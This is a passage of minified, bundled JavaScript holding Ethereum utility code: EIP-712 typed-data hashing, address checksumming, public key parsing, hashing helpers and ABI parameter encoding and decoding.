b(w){if(w==="address"||w==="bool"||w==="string"||w.startsWith("bytes")||w.startsWith("uint")||w.startsWith("int"))throw new n.InvalidStructTypeError({type:w})}return mm}var hX;function e5(){if(hX)return pm;hX=1,Object.defineProperty(pm,"__esModule",{value:!0}),pm.hashTypedData=s,pm.hashDomain=o,pm.hashStruct=a,pm.encodeType=f;const t=Ku(),e=os(),n=lt(),r=ha(),i=sR();function s(b){const{domain:w={},message:y,primaryType:E}=b,A={EIP712Domain:(0,i.getTypesForEIP712Domain)({domain:w}),...b.types};(0,i.validateTypedData)({domain:w,message:y,primaryType:E,types:A});const R=["0x1901"];return w&&R.push(o({domain:w,types:A})),E!=="EIP712Domain"&&R.push(a({data:y,primaryType:E,types:A})),(0,r.keccak256)((0,e.concat)(R))}function o({domain:b,types:w}){return a({data:b,primaryType:"EIP712Domain",types:w})}function a({data:b,primaryType:w,types:y}){const E=c({data:b,primaryType:w,types:y});return(0,r.keccak256)(E)}function c({data:b,primaryType:w,types:y}){const E=[{type:"bytes32"}],A=[l({primaryType:w,types:y})];for(const R of y[w]){const[S,v]=m({types:y,name:R.name,type:R.type,value:b[R.name]});E.push(S),A.push(v)}return(0,t.encodeAbiParameters)(E,A)}function l({primaryType:b,types:w}){const y=(0,n.toHex)(f({primaryType:b,types:w}));return(0,r.keccak256)(y)}function f({primaryType:b,types:w}){let y="";const E=h({primaryType:b,types:w});E.delete(b);const A=[b,...Array.from(E).sort()];for(const R of A)y+=`${R}(${w[R].map(({name:S,type:v})=>`${v} ${S}`).join(",")})`;return y}function h({primaryType:b,types:w},y=new Set){const A=b.match(/^\w*/u)?.[0];if(y.has(A)||w[A]===void 0)return y;y.add(A);for(const R of w[A])h({primaryType:R.type,types:w},y);return y}function m({types:b,name:w,type:y,value:E}){if(b[y]!==void 0)return[{type:"bytes32"},(0,r.keccak256)(c({data:E,primaryType:y,types:b}))];if(y==="bytes")return[{type:"bytes32"},(0,r.keccak256)(E)];if(y==="string")return[{type:"bytes32"},(0,r.keccak256)((0,n.toHex)(E))];if(y.lastIndexOf("]")===y.length-1){const A=y.slice(0,y.lastIndexOf("[")),R=E.map(S=>m({name:w,type:A,types:b,value:S}));return[{type:"bytes32"},(0,r.keccak256)((0,t.encodeAbiParameters)(R.map(([S])=>S),R.map(([,S])=>S)))]}return[{type:y},E]}return pm}var DS={},gm={},pX;function CM(){return pX||(pX=1,Object.defineProperty(gm,"__esModule",{value:!0}),gm.zeroHash=gm.erc6492MagicBytes=void 0,gm.erc6492MagicBytes="0x6492649264926492649264926492649264926492649264926492649264926492",gm.zeroHash="0x0000000000000000000000000000000000000000000000000000000000000000"),gm}var mX;function SM(){if(mX)return DS;mX=1,Object.defineProperty(DS,"__esModule",{value:!0}),DS.isErc6492Signature=n;const t=CM(),e=Jc();function n(r){return(0,e.sliceHex)(r,-32)===t.erc6492MagicBytes}return DS}var BS={},M2={},pk={},qr={},uo={},Ib={},U2={},gX;function m$e(){if(gX)return U2;gX=1,Object.defineProperty(U2,"__esModule",{value:!0}),U2.LruMap=void 0;class t extends Map{constructor(n){super(),Object.defineProperty(this,"maxSize",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.maxSize=n}get(n){const r=super.get(n);return super.has(n)&&r!==void 0&&(this.delete(n),super.set(n,r)),r}set(n,r){if(super.set(n,r),this.maxSize&&this.size>this.maxSize){const i=this.keys().next().value;i&&this.delete(i)}return this}}return U2.LruMap=t,U2}var yX;function g$e(){if(yX)return Ib;yX=1,Object.defineProperty(Ib,"__esModule",{value:!0}),Ib.checksum=void 0,Ib.clear=n;const t=m$e(),e={checksum:new t.LruMap(8192)};Ib.checksum=e.checksum;function n(){for(const r of Object.values(e))r.clear()}return Ib}var ym={},bX;function TM(){if(bX)return ym;bX=1,Object.defineProperty(ym,"__esModule",{value:!0}),ym.keccak256=s,ym.ripemd160=o,ym.sha256=a,ym.validate=c;const t=Zle(),e=cle(),n=Ele(),r=ud(),i=Os();function s(l,f={}){const{as:h=typeof l=="string"?"Hex":"Bytes"}=f,m=(0,e.keccak_256)(r.from(l));return h==="Bytes"?m:i.fromBytes(m)}function o(l,f={}){const{as:h=typeof l=="string"?"Hex":"Bytes"}=f,m=(0,t.ripemd160)(r.from(l));return h==="Bytes"?m:i.fromBytes(m)}function a(l,f={}){const{as:h=typeof l=="string"?"Hex":"Bytes"}=f,m=(0,n.sha256)(r.from(l));return h==="Bytes"?m:i.fromBytes(m)}function c(l){return i.validate(l)&&i.size(l)===32}return ym}var hi={},wX;function cde(){if(wX)return hi;wX=1,Object.defineProperty(hi,"__esModule",{value:!0}),hi.InvalidSerializedSizeError=hi.InvalidUncompressedPrefixError=hi.InvalidCompressedPrefixError=hi.InvalidPrefixError=hi.InvalidError=void 0,hi.assert=i,hi.compress=s,hi.from=o,hi.fromBytes=a,hi.fromHex=c,hi.toBytes=l,hi.toHex=f,hi.validate=h;const t=ud(),e=rc(),n=Os(),r=Y8();function i(A,R={}){const{compressed:S}=R,{prefix:v,x:k,y:O}=A;if(S===!1||typeof k=="bigint"&&typeof O=="bigint"){if(v!==4)throw new b({prefix:v,cause:new y});return}if(S===!0||typeof k=="bigint"&&typeof O>"u"){if(v!==3&&v!==2)throw new b({prefix:v,cause:new w});return}throw new m({publicKey:A})}function s(A){const{x:R,y:S}=A;return{prefix:S%2n===0n?2:3,x:R}}function o(A){const R=(()=>{if(n.validate(A))return c(A);if(t.validate(A))return a(A);const{prefix:S,x:v,y:k}=A;return typeof v=="bigint"&&typeof k=="bigint"?{prefix:S??4,x:v,y:k}:{prefix:S,x:v}})();return i(R),R}function a(A){return c(n.fromBytes(A))}function c(A){if(A.length!==132&&A.length!==130&&A.length!==68)throw new E({publicKey:A});if(A.length===130){const v=BigInt(n.slice(A,0,32)),k=BigInt(n.slice(A,32,64));return{prefix:4,x:v,y:k}}if(A.length===132){const v=Number(n.slice(A,0,1)),k=BigInt(n.slice(A,1,33)),O=BigInt(n.slice(A,33,65));return{prefix:v,x:k,y:O}}const R=Number(n.slice(A,0,1)),S=BigInt(n.slice(A,1,33));return{prefix:R,x:S}}function l(A,R={}){return t.fromHex(f(A,R))}function f(A,R={}){i(A);const{prefix:S,x:v,y:k}=A,{includePrefix:O=!0}=R;return n.concat(O?n.fromNumber(S,{size:1}):"0x",n.fromNumber(v,{size:32}),typeof k=="bigint"?n.fromNumber(k,{size:32}):"0x")}function h(A,R={}){try{return i(A,R),!0}catch{return!1}}class m extends e.BaseError{constructor({publicKey:R}){super(`Value \`${r.stringify(R)}\` is not a valid public key.`,{metaMessages:["Public key must contain:","- an `x` and `prefix` value (compressed)","- an `x`, `y`, and `prefix` value (uncompressed)"]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"PublicKey.InvalidError"})}}hi.InvalidError=m;class b extends e.BaseError{constructor({prefix:R,cause:S}){super(`Prefix "${R}" is invalid.`,{cause:S}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"PublicKey.InvalidPrefixError"})}}hi.InvalidPrefixError=b;class w extends e.BaseError{constructor(){super("Prefix must be 2 or 3 for compressed public keys."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"PublicKey.InvalidCompressedPrefixError"})}}hi.InvalidCompressedPrefixError=w;class y extends e.BaseError{constructor(){super("Prefix must be 4 for uncompressed public keys."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"PublicKey.InvalidUncompressedPrefixError"})}}hi.InvalidUncompressedPrefixError=y;class E extends e.BaseError{constructor({publicKey:R}){super(`Value \`${R}\` is an invalid public key size.`,{metaMessages:["Expected: 33 bytes (compressed + prefix), 64 bytes (uncompressed) or 65 bytes (uncompressed + prefix).",`Received ${n.size(n.from(R))} bytes.`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"PublicKey.InvalidSerializedSizeError"})}}return hi.InvalidSerializedSizeError=E,hi}var vX;function oR(){if(vX)return uo;vX=1,Object.defineProperty(uo,"__esModule",{value:!0}),uo.InvalidChecksumError=uo.InvalidInputError=uo.InvalidAddressError=void 0,uo.assert=o,uo.checksum=a,uo.from=c,uo.fromPublicKey=l,uo.isEqual=f,uo.validate=h;const t=ud(),e=g$e(),n=rc(),r=TM(),i=cde(),s=/^0x[a-fA-F0-9]{40}$/;function o(y,E={}){const{strict:A=!0}=E;if(!s.test(y))throw new m({address:y,cause:new b});if(A){if(y.toLowerCase()===y)return;if(a(y)!==y)throw new m({address:y,cause:new w})}}function a(y){if(e.checksum.has(y))return e.checksum.get(y);o(y,{strict:!1});const E=y.substring(2).toLowerCase(),A=r.keccak256(t.fromString(E),{as:"Bytes"}),R=E.split("");for(let v=0;v<40;v+=2)A[v>>1]>>4>=8&&R[v]&&(R[v]=R[v].toUpperCase()),(A[v>>1]&15)>=8&&R[v+1]&&(R[v+1]=R[v+1].toUpperCase());const S=`0x${R.join("")}`;return e.checksum.set(y,S),S}function c(y,E={}){const{checksum:A=!1}=E;return o(y),A?a(y):y}function l(y,E={}){const A=r.keccak256(`0x${i.toHex(y).slice(4)}`).substring(26);return c(`0x${A}`,E)}function f(y,E){return o(y,{strict:!1}),o(E,{strict:!1}),y.toLowerCase()===E.toLowerCase()}function h(y,E={}){const{strict:A=!0}=E??{};try{return o(y,{strict:A}),!0}catch{return!1}}class m extends n.BaseError{constructor({address:E,cause:A}){super(`Address "${E}" is invalid.`,{cause:A}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Address.InvalidAddressError"})}}uo.InvalidAddressError=m;class b extends n.BaseError{constructor(){super("Address is not a 20 byte (40 hexadecimal character) value."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Address.InvalidInputError"})}}uo.InvalidInputError=b;class w extends n.BaseError{constructor(){super("Address does not match its checksum counterpart."),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Address.InvalidChecksumError"})}}return uo.InvalidChecksumError=w,uo}var Vr={},he={},EX;function xM(){return EX||(EX=1,Object.defineProperty(he,"__esModule",{value:!0}),he.minInt120=he.minInt112=he.minInt104=he.minInt96=he.minInt88=he.minInt80=he.minInt72=he.minInt64=he.minInt56=he.minInt48=he.minInt40=he.minInt32=he.minInt24=he.minInt16=he.minInt8=he.maxInt256=he.maxInt248=he.maxInt240=he.maxInt232=he.maxInt224=he.maxInt216=he.maxInt208=he.maxInt200=he.maxInt192=he.maxInt184=he.maxInt176=he.maxInt168=he.maxInt160=he.maxInt152=he.maxInt144=he.maxInt136=he.maxInt128=he.maxInt120=he.maxInt112=he.maxInt104=he.maxInt96=he.maxInt88=he.maxInt80=he.maxInt72=he.maxInt64=he.maxInt56=he.maxInt48=he.maxInt40=he.maxInt32=he.maxInt24=he.maxInt16=he.maxInt8=he.integerRegex=he.bytesRegex=he.arrayRegex=void 0,he.maxUint256=he.maxUint248=he.maxUint240=he.maxUint232=he.maxUint224=he.maxUint216=he.maxUint208=he.maxUint200=he.maxUint192=he.maxUint184=he.maxUint176=he.maxUint168=he.maxUint160=he.maxUint152=he.maxUint144=he.maxUint136=he.maxUint128=he.maxUint120=he.maxUint112=he.maxUint104=he.maxUint96=he.maxUint88=he.maxUint80=he.maxUint72=he.maxUint64=he.maxUint56=he.maxUint48=he.maxUint40=he.maxUint32=he.maxUint24=he.maxUint16=he.maxUint8=he.minInt256=he.minInt248=he.minInt240=he.minInt232=he.minInt224=he.minInt216=he.minInt208=he.minInt200=he.minInt192=he.minInt184=he.minInt176=he.minInt168=he.minInt160=he.minInt152=he.minInt144=he.minInt136=he.minInt128=void 0,he.arrayRegex=/^(.*)\[([0-9]*)\]$/,he.bytesRegex=/^bytes([1-9]|1[0-9]|2[0-9]|3[0-2])?$/,he.integerRegex=/^(u?int)(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/,he.maxInt8=2n**(8n-1n)-1n,he.maxInt16=2n**(16n-1n)-1n,he.maxInt24=2n**(24n-1n)-1n,he.maxInt32=2n**(32n-1n)-1n,he.maxInt40=2n**(40n-1n)-1n,he.maxInt48=2n**(48n-1n)-1n,he.maxInt56=2n**(56n-1n)-1n,he.maxInt64=2n**(64n-1n)-1n,he.maxInt72=2n**(72n-1n)-1n,he.maxInt80=2n**(80n-1n)-1n,he.maxInt88=2n**(88n-1n)-1n,he.maxInt96=2n**(96n-1n)-1n,he.maxInt104=2n**(104n-1n)-1n,he.maxInt112=2n**(112n-1n)-1n,he.maxInt120=2n**(120n-1n)-1n,he.maxInt128=2n**(128n-1n)-1n,he.maxInt136=2n**(136n-1n)-1n,he.maxInt144=2n**(144n-1n)-1n,he.maxInt152=2n**(152n-1n)-1n,he.maxInt160=2n**(160n-1n)-1n,he.maxInt168=2n**(168n-1n)-1n,he.maxInt176=2n**(176n-1n)-1n,he.maxInt184=2n**(184n-1n)-1n,he.maxInt192=2n**(192n-1n)-1n,he.maxInt200=2n**(200n-1n)-1n,he.maxInt208=2n**(208n-1n)-1n,he.maxInt216=2n**(216n-1n)-1n,he.maxInt224=2n**(224n-1n)-1n,he.maxInt232=2n**(232n-1n)-1n,he.maxInt240=2n**(240n-1n)-1n,he.maxInt248=2n**(248n-1n)-1n,he.maxInt256=2n**(256n-1n)-1n,he.minInt8=-(2n**(8n-1n)),he.minInt16=-(2n**(16n-1n)),he.minInt24=-(2n**(24n-1n)),he.minInt32=-(2n**(32n-1n)),he.minInt40=-(2n**(40n-1n)),he.minInt48=-(2n**(48n-1n)),he.minInt56=-(2n**(56n-1n)),he.minInt64=-(2n**(64n-1n)),he.minInt72=-(2n**(72n-1n)),he.minInt80=-(2n**(80n-1n)),he.minInt88=-(2n**(88n-1n)),he.minInt96=-(2n**(96n-1n)),he.minInt104=-(2n**(104n-1n)),he.minInt112=-(2n**(112n-1n)),he.minInt120=-(2n**(120n-1n)),he.minInt128=-(2n**(128n-1n)),he.minInt136=-(2n**(136n-1n)),he.minInt144=-(2n**(144n-1n)),he.minInt152=-(2n**(152n-1n)),he.minInt160=-(2n**(160n-1n)),he.minInt168=-(2n**(168n-1n)),he.minInt176=-(2n**(176n-1n)),he.minInt184=-(2n**(184n-1n)),he.minInt192=-(2n**(192n-1n)),he.minInt200=-(2n**(200n-1n)),he.minInt208=-(2n**(208n-1n)),he.minInt216=-(2n**(216n-1n)),he.minInt224=-(2n**(224n-1n)),he.minInt232=-(2n**(232n-1n)),he.minInt240=-(2n**(240n-1n)),he.minInt248=-(2n**(248n-1n)),he.minInt256=-(2n**(256n-1n)),he.maxUint8=2n**8n-1n,he.maxUint16=2n**16n-1n,he.maxUint24=2n**24n-1n,he.maxUint32=2n**32n-1n,he.maxUint40=2n**40n-1n,he.maxUint48=2n**48n-1n,he.maxUint56=2n**56n-1n,he.maxUint64=2n**64n-1n,he.maxUint72=2n**72n-1n,he.maxUint80=2n**80n-1n,he.maxUint88=2n**88n-1n,he.maxUint96=2n**96n-1n,he.maxUint104=2n**104n-1n,he.maxUint112=2n**112n-1n,he.maxUint120=2n**120n-1n,he.maxUint128=2n**128n-1n,he.maxUint136=2n**136n-1n,he.maxUint144=2n**144n-1n,he.maxUint152=2n**152n-1n,he.maxUint160=2n**160n-1n,he.maxUint168=2n**168n-1n,he.maxUint176=2n**176n-1n,he.maxUint184=2n**184n-1n,he.maxUint192=2n**192n-1n,he.maxUint200=2n**200n-1n,he.maxUint208=2n**208n-1n,he.maxUint216=2n**216n-1n,he.maxUint224=2n**224n-1n,he.maxUint232=2n**232n-1n,he.maxUint240=2n**240n-1n,he.maxUint248=2n**248n-1n,he.maxUint256=2n**256n-1n),he}var _X;function y$e(){if(_X)return Vr;_X=1,Object.defineProperty(Vr,"__esModule",{value:!0}),Vr.decodeParameter=o,Vr.decodeAddress=l,Vr.decodeArray=f,Vr.decodeBool=h,Vr.decodeBytes=m,Vr.decodeNumber=b,Vr.decodeTuple=w,Vr.decodeString=y,Vr.prepareParameters=E,Vr.prepareParameter=A,Vr.encode=R,Vr.encodeAddress=S,Vr.encodeArray=v,Vr.encodeBytes=k,Vr.encodeBoolean=O,Vr.encodeNumber=_,Vr.encodeString=I,Vr.encodeTuple=T,Vr.getArrayComponents=B,Vr.hasDynamicChild=U;const t=t5(),e=oR(),n=ud(),r=rc(),i=Os(),s=xM();function o(M,N,q){const{checksumAddress:P,staticPosition:C}=q,j=B(N.type);if(j){const[z,$]=j;return f(M,{...N,type:$},{checksumAddress:P,length:z,staticPosition:C})}if(N.type==="tuple")return w(M,N,{checksumAddress:P,staticPosition:C});if(N.type==="address")return l(M,{checksum:P});if(N.type==="bool")return h(M);if(N.type.startsWith("bytes"))return m(M,N,{staticPosition:C});if(N.type.startsWith("uint")||N.type.startsWith("int"))return b(M,N);if(N.type==="string")return y(M,{staticPosition:C});throw new t.InvalidTypeError(N.type)}const a=32,c=32;function l(M,N={}){const{checksum:q=!1}=N,P=M.readBytes(32);return[(j=>q?e.checksum(j):j)(i.fromBytes(n.slice(P,-20))),32]}function f(M,N,q){const{checksumAddress:P,length:C,staticPosition:j}=q;if(!C){const H=n.toNumber(M.readBytes(c)),L=j+H,V=L+a;M.setPosition(L);const G=n.toNumber(M.readBytes(a)),Z=U(N);let J=0;const ne=[];for(let re=0;re<G;++re){M.setPosition(V+(Z?re*32:J));const[le,oe]=o(M,N,{checksumAddress:P,staticPosition:V});J+=oe,ne.push(le)}return M.setPosition(j+32),[ne,32]}if(U(N)){const H=n.toNumber(M.readBytes(c)),L=j+H,V=[];for(let G=0;G<C;++G){M.setPosition(L+G*32);const[Z]=o(M,N,{checksumAddress:P,staticPosition:L});V.push(Z)}return M.setPosition(j+32),[V,32]}let z=0;const $=[];for(let H=0;H<C;++H){const[L,V]=o(M,N,{checksumAddress:P,staticPosition:j+z});z+=V,$.push(L)}return[$,z]}function h(M){return[n.toBoolean(M.readBytes(32),{size:32}),32]}function m(M,N,{staticPosition:q}){const[P,C]=N.type.split("bytes");if(!C){const z=n.toNumber(M.readBytes(32));M.setPosition(q+z);const $=n.toNumber(M.readBytes(32));if($===0)return M.setPosition(q+32),["0x",32];const H=M.readBytes($);return M.setPosition(q+32),[i.fromBytes(H),32]}return[i.fromBytes(M.readBytes(Number.parseInt(C,10),32)),32]}function b(M,N){const q=N.type.startsWith("int"),P=Number.parseInt(N.type.split("int")[1]||"256",10),C=M.readBytes(32);return[P>48?n.toBigInt(C,{signed:q}):n.toNumber(C,{signed:q}),32]}function w(M,N,q){const{checksumAddress:P,staticPosition:C}=q,j=N.components.length===0||N.components.some(({name:H})=>!H),z=j?[]:{};let $=0;if(U(N)){const H=n.toNumber(M.readBytes(c)),L=C+H;for(let V=0;V<N.components.length;++V){const G=N.components[V];M.setPosition(L+$);const[Z,J]=o(M,G,{checksumAddress:P,staticPosition:L});$+=J,z[j?V:G?.name]=Z}return M.setPosition(C+32),[z,32]}for(let H=0;H<N.components.length;++H){const L=N.components[H],[V,G]=o(M,L,{checksumAddress:P,staticPosition:C});z[j?H:L?.name]=V,$+=G}return[z,$]}function y(M,{staticPosition:N}){const q=n.toNumber(M.readBytes(32)),P=N+q;M.setPosition(P);const C=n.toNumber(M.readBytes(32));if(C===0)return M.setPosition(N+32),["",32];const j=M.readBytes(C,32),z=n.toString(n.trimLeft(j));return M.setPosition(N+32),[z,32]}function E({checksumAddress:M,parameters:N,values:q}){const P=[];for(let C=0;C<N.length;C++)P.push(A({checksumAddress:M,parameter:N[C],value:q[C]}));return P}function A({checksumAddress:M=!1,parameter:N,value:q}){const P=N,C=B(P.type);if(C){const[j,z]=C;return v(q,{checksumAddress:M,length:j,parameter:{...P,type:z}})}if(P.type==="tuple")return T(q,{checksumAddress:M,parameter:P});if(P.type==="address")return S(q,{checksum:M});if(P.type==="bool")return O(q);if(P.type.startsWith("uint")||P.type.startsWith("int")){const j=P.type.startsWith("int"),[,,z="256"]=s.integerRegex.exec(P.type)??[];return _(q,{signed:j,size:Number(z)})}if(P.type.startsWith("bytes"))return k(q,{type:P.type});if(P.type==="string")return I(q);throw new t.InvalidTypeError(P.type)}function R(M){let N=0;for(let j=0;j<M.length;j++){const{dynamic:z,encoded:$}=M[j];z?N+=32:N+=i.size($)}const q=[],P=[];let C=0;for(let j=0;j<M.length;j++){const{dynamic:z,encoded:$}=M[j];z?(q.push(i.fromNumber(N+C,{size:32})),P.push($),C+=i.size($)):q.push($)}return i.concat(...q,...P)}function S(M,N){const{checksum:q=!1}=N;return e.assert(M,{strict:q}),{dynamic:!1,encoded:i.padLeft(M.toLowerCase())}}function v(M,N){const{checksumAddress:q,length:P,parameter:C}=N,j=P===null;if(!Array.isArray(M))throw new t.InvalidArrayError(M);if(!j&&M.length!==P)throw new t.ArrayLengthMismatchError({expectedLength:P,givenLength:M.length,type:`${C.type}[${P}]`});let z=!1;const $=[];for(let H=0;H<M.length;H++){const L=A({checksumAddress:q,parameter:C,value:M[H]});L.dynamic&&(z=!0),$.push(L)}if(j||z){const H=R($);if(j){const L=i.fromNumber($.length,{size:32});return{dynamic:!0,encoded:$.length>0?i.concat(L,H):L}}if(z)return{dynamic:!0,encoded:H}}return{dynamic:!1,encoded:i.concat(...$.map(({encoded:H})=>H))}}function k(M,{type:N}){const[,q]=N.split("bytes"),P=i.size(M);if(!q){let C=M;return P%32!==0&&(C=i.padRight(C,Math.ceil((M.length-2)/2/32)*32)),{dynamic:!0,encoded:i.concat(i.padLeft(i.fromNumber(P,{size:32})),C)}}if(P!==Number.parseInt(q,10))throw new t.BytesSizeMismatchError({expectedSize:Number.parseInt(q,10),value:M});return{dynamic:!1,encoded:i.padRight(M)}}function O(M){if(typeof M!="boolean")throw new r.BaseError(`Invalid boolean value: "${M}" (type: ${typeof M}). Expected: \`true\` or \`false\`.`);return{dynamic:!1,encoded:i.padLeft(i.fromBoolean(M))}}function _(M,{signed:N,size:q}){if(typeof q=="number"){const P=2n**(BigInt(q)-(N?1n:0n))-1n,C=N?-P-1n:0n;if(M>P||M<C)throw new i.IntegerOutOfRangeError({max:P.toString(),min:C.toString(),signed:N,size:q/8,value:M.toString()})}return{dynamic:!1,encoded:i.fromNumber(M,{size:32,signed:N})}}function I(M){const N=i.fromString(M),q=Math.ceil(i.size(N)/32),P=[];for(let C=0;C<q;C++)P.push(i.padRight(i.slice(N,C*32,(C+1)*32)));return{dynamic:!0,encoded:i.concat(i.padRight(i.fromNumber(i.size(N),{size:32})),...P)}}function T(M,N){const{checksumAddress:q,parameter:P}=N;let C=!1;const j=[];for(let z=0;z<P.components.length;z++){const $=P.components[z],H=Array.isArray(M)?z:$.name,L=A({checksumAddress:q,parameter:$,value:M[H]});j.push(L),L.dynamic&&(C=!0)}return{dynamic:C,encoded:C?R(j):i.concat(...j.map(({encoded:z})=>z))}}function B(M){const N=M.match(/^(.*)\[(\d+)?\]$/);return N?[N[2]?Number(N[2]):null,N[1]]:void 0}function U(M){const{type:N}=M;if(N==="string"||N==="bytes"||N.endsWith("[]"))return!0;if(N==="tuple")return M.components?.some(U);const q=B(M.type);return!!(q&&U({...M,type:q[1]}))}return Vr}var Tl={},AX;function ude(){if(AX)return Tl;AX=1,Object.defineProperty(Tl,"__esModule",{value:!0}),Tl.RecursiveReadLimitExceededError=Tl.PositionOutOfBoundsError=Tl.NegativeOffsetError=void 0,Tl.create=n;const t=rc(),e={bytes:new Uint8Array,dataView:new DataView(new ArrayBuffer(0)),position:0,positionReadCount:new Map,recursiveReadCount:0,recursiveReadLimit:Number.POSITIVE_INFINITY,assertReadLimit(){if(this.recursiveReadCount>=this.recursiveReadLimit)throw new s({count:this.recursiveReadCount+1,limit:this.recursiveReadLimit})},assertPosition(o){if(o<0||o>this.bytes.length-1)throw new i({length:this.bytes.length,position:o})},decrementPosition(o){if(o<0)throw new r({offset:o});const a=this.position-o;this.assertPosition(a),this.position=a},getReadCount(o){return this.positionReadCount.get(o||this.position)||0},incrementPosition(o){if(o<0)throw new r({offset:o});const a=this.position+o;this.assertPosition(a),this.position=a},inspectByte(o){const a=o??this.position;return this.assertPosition(a),this.bytes[a]},inspectBytes(o,a){const c=a??this.position;return this.assertPosition(c+o-1),this.bytes.subarray(c,c+o)},inspectUint8(o){const a=o??this.position;return this.assertPosition(a),this.bytes[a]},inspectUint16(o){const a=o??this.position;return this.assertPosition(a+1),this.dataView.getUint16(a)},inspectUint24(o){const a=o??this.position;return this.assertPosition(a+2),(this.dataView.getUint16(a)<<8)+this.dataView.getUint8(a+2)},inspectUint32(o){const a=o??this.position;return this.assertPosition(a+3),this.dataView.getUint32(a)},pushByte(o){this.assertPosition(this.position),this.bytes[this.position]=o,this.position++},pushBytes(o){this.assertPosition(this.position+o.length-1),this.bytes.set(o,this.position),this.position+=o.length},pushUint8(o){this.assertPosition(this.position),this.bytes[this.position]=o,this.position++},pushUint16(o){this.assertPosition(this.position+1),this.dataView.setUint16(this.position,o),this.position+=2},pushUint24(o){this.assertPosition(this.position+2),this.dataView.setUint16(this.position,o>>8),this.dataView.setUint8(this.position+2,o&255),this.position+=3},pushUint32(o){this.assertPosition(this.position+3),this.dataView.setUint32(this.position,o),this.position+=4},readByte(){this.assertReadLimit(),this._touch();const o=this.inspectByte();return this.position++,o},readBytes(o,a){this.assertReadLimit(),this._touch();const c=this.inspectBytes(o);return this.position+=a??o,c},readUint8(){this.assertReadLimit(),this._touch();const o=this.inspectUint8();return this.position+=1,o},readUint16(){this.assertReadLimit(),this._touch();const o=this.inspectUint16();return this.position+=2,o},readUint24(){this.assertReadLimit(),this._touch();const o=this.inspectUint24();return this.position+=3,o},readUint32(){this.assertReadLimit(),this._touch();const o=this.inspectUint32();return this.position+=4,o},get remaining(){return this.bytes.length-this.position},setPosition(o){const a=this.position;return this.assertPosition(o),this.position=o,()=>this.position=a},_touch(){if(this.recursiveReadLimit===Number.POSITIVE_INFINITY)return;const o=this.getReadCount();this.positionReadCount.set(this.position,o+1),o>0&&this.recursiveReadCount++}};function n(o,{recursiveReadLimit:a=8192}={}){const c=Object.create(e);return c.bytes=o,c.dataView=new DataView(o.buffer,o.byteOffset,o.byteLength),c.positionReadCount=new Map,c.recursiveReadLimit=a,c}class r extends t.BaseError{constructor({offset:a}){super(`Offset \`${a}\` cannot be negative.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Cursor.NegativeOffsetError"})}}Tl.NegativeOffsetError=r;class i extends t.BaseError{constructor({length:a,position:c}){super(`Position \`${c}\` is out of bounds (\`0 < position < ${a}\`).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Cursor.PositionOutOfBoundsError"})}}Tl.PositionOutOfBoundsError=i;class s extends t.BaseError{constructor({count:a,limit:c}){super(`Recursive read limit of \`${c}\` exceeded (recursive read count: \`${a}\`).`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"Cursor.RecursiveReadLimitExceededError"})}}return Tl.RecursiveReadLimitExceededError=s,Tl}var CX;function t5(){if(CX)return qr;CX=1,Object.defineProperty(qr,"__esModule",{value:!0}),qr.InvalidTypeError=qr.InvalidArrayError=qr.LengthMismatchError=qr.BytesSizeMismatchError=qr.ArrayLengthMismatchError=qr.ZeroDataError=qr.DataSizeTooSmallError=void 0,qr.decode=c,qr.encode=l,qr.encodePacked=f,qr.format=h,qr.from=m;const t=n0(),e=oR(),n=ud(),r=rc(),i=Os(),s=y$e(),o=ude(),a=xM();function c(v,k,O={}){const{as:_="Array",checksumAddress:I=!1}=O,T=typeof k=="string"?n.fromHex(k):k,B=o.create(T);if(n.size(T)===0&&v.length>0)throw new w;if(n.size(T)&&n.size(T)<32)throw new b({data:typeof k=="string"?k:i.fromBytes(k),parameters:v,size:n.size(T)});let U=0;const M=_==="Array"?[]:{};for(let N=0;N<v.length;++N){const q=v[N];B.setPosition(U);const[P,C]=s.decodeParameter(B,q,{checksumAddress:I,staticPosition:0});U+=C,_==="Array"?M.push(P):M[q.name??N]=P}return M}function l(v,k,O){const{checksumAddress:_=!1}=O??{};if(v.length!==k.length)throw new A({expectedLength:v.length,givenLength:k.length});const I=s.prepareParameters({checksumAddress:_,parameters:v,values:k}),T=s.encode(I);return T.length===0?"0x":T}function f(v,k){if(v.length!==k.length)throw new A({expectedLength:v.length,givenLength:k.length});const O=[];for(let _=0;_<v.length;_++){const I=v[_],T=k[_];O.push(f.encode(I,T))}return i.concat(...O)}(function(v){function k(O,_,I=!1){if(O==="address"){const M=_;return e.assert(M),i.padLeft(M.toLowerCase(),I?32:0)}if(O==="string")return i.fromString(_);if(O==="bytes")return _;if(O==="bool")return i.padLeft(i.fromBoolean(_),I?32:1);const T=O.match(a.integerRegex);if(T){const[M,N,q="256"]=T,P=Number.parseInt(q,10)/8;return i.fromNumber(_,{size:I?32:P,signed:N==="int"})}const B=O.match(a.bytesRegex);if(B){const[M,N]=B;if(Number.parseInt(N,10)!==(_.length-2)/2)throw new E({expectedSize:Number.parseInt(N,10),value:_});return i.padRight(_,I?32:0)}const U=O.match(a.arrayRegex);if(U&&Array.isArray(_)){const[M,N]=U,q=[];for(let P=0;P<_.length;P++)q.push(k(N,_[P],!0));return q.length===0?"0x":i.concat(...q)}throw new S(O)}v.encode=k})(f||(qr.encodePacked=f={}));function h(v){return t.formatAbiParameters(v)}function m(v){return Array.isArray(v)&&typeof v[0]=="string"||typeof v=="string"?t.parseAbiParameters(v):v}class b extends r.BaseError{constructor({data:k,parameters:O,size:_}){super(`Data size of ${_} bytes is too small for given parameters.`,{metaMessages:[`Params: (${t.formatAbiParameters(O)})`,`Data:   ${k} (${_} 